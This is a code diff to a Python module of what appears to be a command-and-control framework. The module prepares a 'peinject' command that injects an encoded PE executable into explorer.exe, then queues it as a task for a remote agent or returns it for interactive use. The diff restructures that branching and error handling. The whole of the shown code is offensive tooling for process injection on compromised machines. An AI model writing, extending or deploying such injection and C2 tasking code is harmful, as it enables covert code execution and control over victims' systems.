@@ -69,33 +69,42 @@ def execute(options, session):
 
     command = f"peinject {prefixed_encoded_pe}"
 
-    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
+    # Check if this is being executed in interactive mode
+    if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
+        # Return the command that should be executed interactively
+        return {
+            "success": True,
+            "output": f"[x] PE injection prepared for interactive mode",
+            "command": command,
+            "target_process": "explorer.exe"
+        }
+    elif not hasattr(session, 'agent_manager') or session.agent_manager is None:
         return {
             "success": False,
             "error": "Session does not have an initialized agent_manager"
         }
-
-    # Queue the task on the agent
-    try:
-        agent_manager = session.agent_manager
-        task_id = agent_manager.add_task(agent_id, command)
-        if task_id:
-            return {
-                "success": True,
-                "output": f"[x] PE injection task {task_id} queued for agent {agent_id}",
-                "task_id": task_id,
-                "target_process": "explorer.exe"
-            }
-        else:
+    else:
+        # Queue the task on the agent
+        try:
+            agent_manager = session.agent_manager
+            task_id = agent_manager.add_task(agent_id, command)
+            if task_id:
+                return {
+                    "success": True,
+                    "output": f"[x] PE injection task {task_id} queued for agent {agent_id}",
+                    "task_id": task_id,
+                    "target_process": "explorer.exe"
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": f"Failed to queue task for agent {agent_id}"
+                }
+        except Exception as e:
             return {
                 "success": False,
-                "error": f"Failed to queue task for agent {agent_id}"
+                "error": f"Error queuing task: {str(e)}"
             }
-    except Exception as e:
-        return {
-            "success": False,
-            "error": f"Error queuing task: {str(e)}"
-        }
 
 
 def process_pe_input(pe_input):
